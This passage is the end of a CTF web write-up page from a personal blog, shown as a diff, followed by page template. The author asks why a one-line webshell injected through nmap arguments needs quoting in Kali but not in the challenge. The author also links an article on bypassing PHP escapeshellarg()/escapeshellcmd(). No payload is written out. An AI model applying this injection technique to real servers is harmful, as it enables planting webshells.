+<p>最后的最后还是留下一个小问题，求助求助：<br><br>Q 为什么我kali执行nmap命令时，如果不用<code>&#39;&#39;</code>将一句话木马括起来就无法执行，而这里最终执行时的一句话木马是可以不被<code>&#39;&#39;</code>括起来的。<br><br>指路1：一个很漂亮的Nmap思维导图<a target="_blank" rel="noopener" href="https://blog.csdn.net/ZripenYe/article/details/123344685?ops_request_misc=&request_id=&biz_id=102&utm_term=nmap%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-123344685.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_control1&spm=1018.2226.3001.4187">Nmap 基本使用指南思维导图（原创）</a><br><br>指路2：<a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>
+</blockquote>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/web/"># web</a>
+                    
+                        
+                </span>
+            </div>
+            <div class="reward" >
+                
+                    
+
+                
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/12/27/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web-%E9%83%A8%E5%88%86/">2022Dest0g3-520迎新赛-web(部分)</a>
+            
+        </section>
+
+        
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Ex1Le23 | Always Hold the Belief.</span>
+    </div>
+</footer>
+
+    </div>
+    <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" onchange="inputChange(event)" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                网址，例如： front-matter---layout: postdate: <b mark></b>
+                                7-07-05title: [转]如何搭建基于Hexo的独立博客categories: [Dev, Hexo]tags: - Hexoauthor: name: xaoxuu avatar: https://cdn.jsdelivr.......
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+</body>
+</html>
